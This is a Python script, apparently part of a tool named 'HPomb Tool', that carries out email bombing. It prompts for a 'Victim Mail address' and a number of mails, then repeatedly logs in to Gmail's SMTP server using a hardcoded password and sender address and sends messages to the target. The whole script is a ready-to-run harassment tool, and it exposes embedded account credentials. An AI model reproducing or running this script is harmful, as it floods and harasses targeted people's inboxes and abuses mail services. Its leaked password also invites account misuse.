#!/usr/bin/env python
try:
    from datetime import datetime
    import os
    import hashlib
    import sys
    import time
    import threading
    import string
    import random
    import base64
    import urllib.request
    import urllib.parse
    import subprocess
    import webbrowser
    import smtplib
    import sys
    import os
    import subprocess
    import json
    import notify2
     
except :
    print("Plase Install Require Package \nUsing 'pip install -r requirement.txt'")


Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'
verl = open("core/.version", 'r').read()

def startM():
    try:
        notify2.init('HPomb Tool')
        n = notify2.Notification("HPomb Tool",
                                 "Mail Bombing Start",
                                 ""
                                )
        n.show()
        n.timeout = 50000
        print("\a")
    except:
        print("Sorry Notification Feature Not For You")


def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    
    clr()
    logo="""
 ██░ ██  ██▓███   ▒█████   ███▄ ▄███▓ ▄▄▄▄   
▓██░ ██▒▓██░  ██▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
▒██▀▀██░▓██░ ██▓▒▒██░  ██▒▓██    ▓██░▒██▒ ▄██
░▓█ ░██ ▒██▄█▓▒ ▒▒██   ██░▒██    ▒██ ▒██░█▀  
░▓█▒░██▓▒██▒ ░  ░░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
 ▒ ░░▒░▒▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
 ▒ ░▒░ ░░▒ ░       ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
 ░  ░░ ░░░       ░ ░ ░ ▒  ░      ░    ░    ░ 
 ░  ░  ░             ░ ░         ░    ░      
                                           ░ 

               ""","""
----------------   ----------------------
| KLS  Project |   | Version : """,verl,""" |
----------------   ----------------------
\n\tCreated by Honey Pots...\n
-------------------------------------------- 
"""
    print(Red+logo[0]+Blue+logo[1]+logo[2]+logo[3])


def mail():
    b = 0
    RG = str(input("Enter Victim Mail address : "))
    num = input("Enter Number of Mail : ")
    while num == '':
        num = input("Please Enter Number of Mail : ")

    while num.isdigit() != True:
        num = input("\aInvalid! Please Enter Number of Mail : ")

    mail = int(num) + 1
    print("\n\t\tPlease Wait Bombing Start...")
    
    startM()
    for i in range(1,mail):
        with open("core/data.json") as f:
            data = json.load(f)
            js_fil = data['js']
            js = js_fil[random.randrange(0,3)]
        fil = "sdha$#ehh09" 
        try:
            conn = smtplib.SMTP('smtp.gmail.com',587)
            tr = fil
            conn.ehlo()
            utt = tr
            conn.starttls()
            conn.login(js, utt)

        
            conn.sendmail("h899502@gmail.com",RG,'Subject: Hello \n\n hello ')
            clr()
            banner()
            print(Blue)
            print("-------------------------------------------- ")
            print(Red +"                  Details "+Blue)
            print("   Target Gmail           : ",RG)
            print("   Number of Requests Sent : ", num)
            print("   Successful Requests     : ", 0)
            print("   Failed Requests         : ", i )
            print("-------------------------------------------- ")
            print("            Bombing In Progress")
        except :
            b =+ 1
            clr()
            banner()
            print(Blue)
            print("-------------------------------------------- ")
            print(Red +"                  Details "+Blue)
            print("   Target Gmail           : ",RG)
            print("   Number of Requests Sent : ", num)
            print("   Successful Requests     : ", 0)
            print("   Failed Requests         : ", i )
            print("-------------------------------------------- ")
            print(" Something Wrong Please Try Again")

clr()
banner()
try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("   You are not connected To Internet!!!")
    print("\n  Please Connect To Internet To Continue...\n")
    input('   Press Enter To Use Again Mail Bombing ...')
    subprocess.call([sys.executable, 'ml.py'])
mail()
